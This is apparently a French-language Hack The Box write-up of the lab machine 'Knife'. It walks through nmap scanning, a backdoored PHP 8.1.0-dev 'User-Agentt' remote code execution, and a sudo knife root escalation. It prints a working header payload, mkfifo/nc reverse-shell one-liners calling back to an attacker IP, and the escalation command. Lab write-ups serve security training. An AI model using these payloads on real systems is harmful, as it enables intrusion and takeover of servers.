---
title: HTB | Knife
description: Knife is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration is then exploited to gain a root shell. 
slug: knife-htb
date: 2025-01-22 00:00:00+0000
cover:
  image: cover.png
  hidden: true     # cache la bannière
categories:
    - HackTheBox
tags:
    - Linux
    - Easy
weight: 1       ## You can add weight to some posts to override the default sorting (date descending)
---
<!-- 
<img src="cover.png" alt="Knife cover" class="logo-htb">

| Machine name   | OS         | IP           | Difficulty |
| :-----------:  | :--------: | :----------: | :--------: |
| Knife          | Linux      | 10.10.10.242 | Easy       |
 -->

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Knife cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Knife</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.242</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
$ nmap -sC -sV -An -T4 -vvv 10.10.10.242

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EA...
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2....
|   256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1l....
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold

### PHP 8.1.0-dev (RCE)
Avec burp, on observe que le serveur utilise la version 8.1.0-dev de php. Avec **searchsploit**, on voit qu'il existe une RCE sur cette version de php : 
```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit 8.1.0-dev 

PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                                                                 | php/webapps/49933.py
```

### Exploit from searchsploit
On peut utiliser un script python pour exploiter la vuln:
```bash
┌──(kali㉿kali)-[~/htb/Knife]
└─$ python3 49933.py   
Enter the full host url:
http://knife.htb

Interactive shell is opened on http://knife.htb 
Can't acces tty; job crontol turned off.
$ whoami
james
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.6 1337 >/tmp/f

------------------------------------

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1337              
listening on [any] 1337 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.242] 60424
bash: cannot set terminal process group (1025): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ whoami
whoami
james
```

### Exploit from Burp
La vulnérabilité consiste à ajouter une variable "User-Agentt", avec 2 "t", et d'écrire la commande a executé dans la fonction "zerodiumsystem('COMMANDE_ICI')" :
```bash
## FROM BURP :

GET / HTTP/1.1
Host: knife.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
User-Agentt: zerodiumsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.6 1337 >/tmp/f');
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1

---------------------------------

┌──(kali㉿kali)-[~/htb/Knife]
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.242] 60498
bash: cannot set terminal process group (1025): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
james@knife:/$ export TERM=xterm
export TERM=xterm
james@knife:/$ ^Z
zsh: suspended  nc -lnvp 1337
                                        
┌──(kali㉿kali)-[~/htb/Knife]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 1337

james@knife:/$ whoami
james
james@knife:/$ cd
james@knife:~$ cat user.txt 
4819.....4e49f
```

## Privilege Escalation

### Knife Binary exploit
Avec **sudo -l**, on observe que l'on peut executer le binaire knife en tant que root. Sur `gtfobins`, on trouve rapidement une exploit pour faire une élévation de privilège avec ce binaire.  

Voici le lien exacte de la page :
https://gtfobins.github.io/gtfobins/knife/

```bash
james@knife:/home$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
james@knife:/home$ sudo knife exec -E 'exec "/bin/sh"'
## whoami
root
## cd /root
## cat root.txt
3db8b.....ce60
```